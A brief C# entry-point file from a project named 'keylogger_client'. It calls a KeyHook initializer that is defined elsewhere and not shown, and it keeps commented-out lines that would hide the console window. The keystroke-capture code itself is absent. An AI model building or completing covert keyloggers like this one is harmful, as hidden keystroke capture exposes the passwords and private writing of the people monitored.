using System;

namespace keylogger_client
{
    class Program
    {
        static void Main(string[] args)
        {
            //IntPtr hWndConsole = HiddenWinConsole.GetConsoleWindow();
            //HiddenWinConsole.ShowWindow(hWndConsole, 0);
            KeyHook.Initialize();
            Console.WriteLine("Press enter to stop...");
            Console.Read();
        }
    }
}
